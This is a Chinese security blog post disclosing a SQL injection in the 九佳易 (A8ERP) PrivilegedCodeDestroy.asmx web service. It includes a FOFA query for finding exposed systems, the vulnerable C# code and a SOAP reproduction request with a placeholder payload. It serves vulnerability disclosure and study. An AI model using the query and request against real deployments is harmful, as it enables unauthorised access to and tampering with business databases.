---
title: "九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html
asset_dir: assets/九佳易管理系统-privilegedcodedestroy.asmx-sql注入漏洞
---

# 九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/1 08:35
* 225浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

程序接口

软件

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

九佳易系统管理系统中的 PrivilegedCodeDestroy.asmx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

SQL注入防护

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

深入探索

安全认证考试

云安全解决方案

网络安全会议

根据 Interface/licx/PrivilegedCodeDestroy.asmx 的代码引用

```
<%@ WebService Language="C#" CodeBehind="PrivilegedCodeDestroy.asmx.cs" Class="A8ERP.Interface.licx.PrivilegedCodeDestroy" %>
```

找到 A8ERP.Interface.licx.PrivilegedCodeDestroy 相关类的实现逻辑

代码安全审计

```
using System;
using System.ComponentModel;
using System.Data.Common;
using System.Web.Services;

#nullable disable
namespace A8ERP.Interface.licx;

[WebService(Namespace = "http://tempuri.org/")]
[ToolboxItem(false)]
[WebServiceBinding]
public class PrivilegedCodeDestroy : WebService
{
  [WebMethod]
  public string UpdatePrivilegedState(string code)
  {
    DBHelp dbHelp = new DBHelp();
    dbHelp.Open();
    try
    {
      string sql = $"UPDATE privileged_state SET zt='1' WHERE code='{code}'";
      ((DbCommand) dbHelp.GetCommand(sql)).ExecuteNonQuery();
    }
    catch (Exception ex)
    {
    }
    finally
    {
      dbHelp.Close();
    }
    return "";
  }
}
```

深入探索

Windows安全工具

企业安全咨询

服务器安全服务

非常明显拼接导致的SQL注入，参数code无任何过滤或校验被直接拼接到`$"UPDATE privileged_state SET zt='1' WHERE code='{code}'";`sql语句中，然后调用`dbHelp.GetCommand(sql)).ExecuteNonQuery()`方法进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式
>
> 漏洞预警服务

```
POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1
SOAPAction: http://tempuri.org/UpdatePrivilegedState
Content-Type: text/xml;charset=UTF-8
Host: a8erp.mrxn.net

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:UpdatePrivilegedState>
         <!--type: string-->
         <tem:code>SQLI_POC</tem:code>
      </tem:UpdatePrivilegedState>
   </soap:Body>
</soap:Envelope>
```

[![九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](images/img-001-8ff688821274.webp)](https://image.mrxn.net/8c599956db92414a9b0492bb82cbf26d.webp)

成功延时 5 秒

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)  
文章链接：<https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

网络

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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